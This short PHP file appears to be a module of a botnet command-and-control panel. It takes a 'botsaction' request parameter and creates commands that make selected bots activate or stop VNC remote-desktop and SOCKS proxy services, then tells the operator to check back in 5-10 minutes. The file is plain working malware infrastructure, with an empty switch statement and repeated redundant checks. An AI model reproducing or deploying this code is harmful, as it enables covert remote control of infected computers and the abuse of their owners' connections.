<?php

if (!defined('__CP__')) {
	exit();
}

include_once __DIR__ . '/Socks.php';

switch ($_REQUEST['botsaction']) {
case 'activate_vnc':
	$title = 'Activate vnc';
	$command = 'create_vnc';
	break;

case 'activate_socks':
	$title = 'Activate socks';
	$command = 'create_socks';
	break;

case 'stop_vnc':
	$title = 'Stop vnc';
	$command = 'stop_vnc';
	break;

case 'stop_socks':
	$title = 'Stop socks';
	$command = 'stop_socks';
	break;

default:
	exit();
}

switch ($_REQUEST['botsaction']) {
}

ThemeBegin($title, 0, 0, 0, NULL, true, '', false, true);
if (isset($_REQUEST['bots']) && defined('__CP__') && defined('__CP__') && defined('__CP__')) {
	$socks = new Socks(true, false);
	$r = $socks->createCommand($command, $_REQUEST['bots']);

	if ($r) {
		print('The command for bots was created, wait 5-10 minutes and check their status.');
	}
	else {
		print('Couldn\'t create the command.');
	}
}
else {
	print('No parameters.');
}

ThemeEnd();

?>
